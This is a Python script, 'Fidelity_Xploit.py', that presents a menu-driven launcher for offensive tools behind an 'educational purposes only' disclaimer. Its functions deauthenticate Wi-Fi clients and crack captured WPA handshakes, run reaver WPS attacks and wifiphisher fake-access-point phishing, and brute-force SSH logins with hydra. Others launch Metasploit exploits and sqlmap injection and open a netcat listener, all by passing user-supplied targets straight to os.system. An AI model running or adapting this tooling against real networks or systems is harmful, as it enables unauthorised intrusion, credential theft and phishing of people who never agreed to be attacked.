# Fidelity_Xploit.py developed by Md. Abu Naser Nayeem[Tanjib]_Mr.EchoFi 
# This script is for educational purposes only.
# copyright (c) 2024 Md. Abu Naser Nayeem[Tanjib]_Mr.EchoFi

import os
import subprocess
from subprocess import check_call
import shutil

def is_tool_installed(tool_name):
    """Check if a tool is installed on the system."""
    return shutil.which(tool_name) is not None

# Function to install required tools
def install_tools():
    print("\nInstalling Necessary Tools...")
    tools = [
        "aircrack-ng", "crunch", "xterm", "wordlists", "reaver", "pixiewps", 
        "bully", "wifite", "airodump-ng", "nmap", "metasploit-framework", 
        "hydra", "wifiphisher", "nikto", "netcat", "gobuster", "ncat", "sqlmap"
    ]
    for tool in tools:
        cmd = f"sudo apt-get install -y {tool}"
        print(f"Installing {tool}...")
        os.system(cmd)

# Functions for Wireless Network and WPS Attacks 
def start_monitor_mode(interface):
    print(f"Starting monitor mode on {interface}...")
    os.system(f"airmon-ng start {interface} && airmon-ng check kill")

def stop_monitor_mode(interface):
    print(f"Stopping monitor mode on {interface}...")
    os.system(f"airmon-ng stop {interface} && service network-manager restart")

def scan_networks(interface):
    print(f"Scanning for networks on {interface}...")
    os.system(f"airodump-ng {interface} -M")

def get_handshake(interface, bssid, channel, path, packets):
    print(f"Capturing handshake from {bssid} on channel {channel}...")
    os.system(f"airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | xterm -e aireplay-ng -0 {packets} -a {bssid} {interface}")

# Crack WPA Handshake using Wordlist or without Wordlist
def crack_handshake_with_wordlist(handshake_path, wordlist_path):
    print(f"Cracking handshake from {handshake_path} using wordlist {wordlist_path}...")
    os.system(f"aircrack-ng {handshake_path} -w {wordlist_path}")

def crack_handshake_without_wordlist(handshake_path, essid):
    print(f"Cracking handshake from {handshake_path} with ESSID {essid}...")
    os.system(f"aircrack-ng {handshake_path} -e {essid}")

# Functions to Create Wordlist and Perform WPS Attack
def create_wordlist(min_length, max_length, characters, output_path):
    print(f"Creating wordlist with length from {min_length} to {max_length}...")
    os.system(f"crunch {min_length} {max_length} {characters} -o {output_path}")

def perform_wps_attack(interface, bssid):
    print(f"Performing WPS attack on {bssid}...")
    os.system(f"reaver -i {interface} -b {bssid} -vv")

# Nmap Network Scanning
def scan_networks_with_nmap(target_ip):
    print(f"Scanning network with Nmap on target {target_ip}...")
    os.system(f"nmap -sP {target_ip}")

# Metasploit Exploit
def run_metasploit_exploit(exploit_name):
    print(f"Running Metasploit exploit: {exploit_name}...")
    os.system(f"msfconsole -x 'use {exploit_name}; run'")

# Hydra Brute Force Login
def perform_brute_force_login(target_ip, username, password_file):
    print(f"Brute-forcing login on {target_ip} with username {username}...")
    os.system(f"hydra -l {username} -P {password_file} {target_ip} ssh")

# Phishing Attack with Wifiphisher
def perform_phishing_attack(interface, bssid):
    print(f"Performing phishing attack on {bssid}...")
    os.system(f"wifiphisher -i {interface} --fakeap -b {bssid}")

# Nikto Web Server Scan
def scan_web_server_with_nikto(target_url):
    print(f"Scanning web server {target_url} with Nikto...")
    os.system(f"nikto -h {target_url}")

# Listening on Port with Netcat
def listen_with_netcat(port):
    print(f"Listening on port {port} with Netcat...")
    os.system(f"nc -lvp {port}")

# Directory Brute Forcing with Gobuster
def brute_force_directories(target_url):
    print(f"Brute forcing directories on {target_url}...")
    os.system(f"gobuster dir -u {target_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")

# SQL Injection with SQLMap
def perform_sql_injection(target_url):
    print(f"Performing SQL Injection attack on {target_url} with SQLMap...")
    os.system(f"sqlmap -u {target_url} --batch")

# Main menu to interact with the script
def main():
    while True:
        print("""
        
    

   ___ _     _      _ _ _            __  __      _       _ _   
  / __(_) __| | ___| (_) |_ _   _    \ \/ /_ __ | | ___ (_) |_ 
 / _\ | |/ _` |/ _ \ | | __| | | |    \  /| '_ \| |/ _ \| | __|
/ /   | | (_| |  __/ | | |_| |_| |    /  \| |_) | | (_) | | |_ 
\/    |_|\__,_|\___|_|_|\__|\__, |___/_/\_\ .__/|_|\___/|_|\__|
                            |___/_____|   |_|                  
                                            Version: 1.0.0
                                                                                                                                           
                      ................                      
                 ..:=#@@@@@@@@@@@@@@@@#=:..                  
              .-#@@@@@@@@@@@@@@@@@@@@@@@@@@#-.               
           .-%@@@@@@@@@#+=-::..::--+#@@@@@@@@@%=.           
         .#@@@@@@@%-..                ..-%@@@@@@@#.         
       .%@@@@@@*.    ..:+#@@@@@@@@%+:..    .*@@@@@@%.       
       +@@@@@-   ..=@@@@@@@@@@@@@@@@@@@@+..  .-%@@@@+.      
       .+%#:.  .+@@@@@@@@@@%####%@@@@@@@@@@+.  .:#%+.       
             .#@@@@@@@+:...      . .:=@@@@@@@#.             
            .*@@@@@=..    ..-++-:.     .=@@@@@#             ||*  Author: Md. Abu Naser Nayeem[Tanjib]_Mr.EchoFi
             .@@@-. ..:%@@@@@@@@@@@@%:..  :@@@:             ||        Date: 2024-06-02
                   .+@@@@@@@@@@@@@@@@@@*.                   ||  
                   %@@@@@#=..  ..-#@@@@@%                   ||  https://github.com/MrEchoFi/MrEchoFi
                   -@@@-..        ..-@@@=                   ||  
                           .:=+:.                           ||*  copyright (c) 2024 Md. Abu Naser Nayeem[Tanjib]_Mr.EchoFi
                        ..*@@@@@@*.                         
                         =@@@@@@@@=                         
                        .-@@@@@@@@-                         
                          -@@@@@@=.                         
                           ......                           
                                                            
                                                                                                                                                                                                                                                                              
            -------------------------------------------------------------------------------------------------------  

            Menu:
            0) Exit                                       
            1) Start monitor mode                          |        10) Perform WPS attack
            2) Stop monitor mode                           |        11) Scan network with Nmap
            3) Scan networks                               |        12) Run Metasploit exploit
            4) Capture handshake                           |        13) Brute-force login with Hydra
            5) Install wireless tools                      |        14) Perform phishing attack with Wifiphisher
            6) Crack handshake (rockyou.txt)               |        15) Scan web server with Nikto
            7) Crack handshake with custom wordlist        |        16) Listen with Netcat
            8) Crack handshake without wordlist            |        17) Brute-force directories with Gobuster
            9) Create wordlist                             |        18) Perform SQL Injection with SQLMap
                                                           |
            
           --------------------------------------------------------------------------------------------------------  
""")

        choice = input("Enter your choice: ")

        if choice == '1':
            interface = input("write the interface: ")
            start_monitor_mode(interface)
        elif choice == '2':
            interface = input("write the interface: ")
            stop_monitor_mode(interface)
        elif choice == '3':
            interface = input("write the interface: ")
            scan_networks(interface)
        elif choice == '4':
            interface = input("write the interface: ")
            bssid = input("write the target BSSID: ")
            channel = input("write the channel: ")
            path = input("write the path for output file: ")
            packets = input("write the number of packets: ")
            get_handshake(interface, bssid, channel, path, packets)
        elif choice == '5':
            install_tools()
        elif choice == '6':
            handshake_path = input("write the handshake file path: ")
            crack_handshake_with_wordlist(handshake_path, "/usr/share/wordlists/rockyou.txt")
        elif choice == '7':
            handshake_path = input("write the handshake file path: ")
            wordlist_path = input("write the wordlist file path: ")
            crack_handshake_with_wordlist(handshake_path, wordlist_path)
        elif choice == '8':
            handshake_path = input("write the handshake file path: ")
            essid = input("write the ESSID: ")
            crack_handshake_without_wordlist(handshake_path, essid)
        elif choice == '9':
            min_length = int(input("write the minimum length of passwords: "))
            max_length = int(input("write the maximum length of passwords: "))
            characters = input("write characters for the wordlist: ")
            output_path = input("write the output path for the wordlist: ")
            create_wordlist(min_length, max_length, characters, output_path)
        elif choice == '10':
            interface = input("write the interface: ")
            bssid = input("write the BSSID: ")
            perform_wps_attack(interface, bssid)
        elif choice == '11':
            target_ip = input("write the target IP for Nmap scan: ")
            scan_networks_with_nmap(target_ip)
        elif choice == '12':
            exploit_name = input("write the Metasploit exploit name: ")
            run_metasploit_exploit(exploit_name)
        elif choice == '13':
            target_ip = input("write the target IP for Hydra brute-force: ")
            username = input("write the username: ")
            password_file = input("write the password file path: ")
            perform_brute_force_login(target_ip, username, password_file)
        elif choice == '14':
            interface = input("write the interface: ")
            bssid = input("write the BSSID: ")
            perform_phishing_attack(interface, bssid)
        elif choice == '15':
            target_url = input("write the target URL: ")
            scan_web_server_with_nikto(target_url)
        elif choice == '16':
            port = input("write the port to listen on: ")
            listen_with_netcat(port)
        elif choice == '17':
            target_url = input("write the target URL: ")
            brute_force_directories(target_url)
        elif choice == '18':
            target_url = input("write the target URL for SQL Injection: ")
            perform_sql_injection(target_url)
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice_please try again!")

if __name__ == "__main__":
    main()
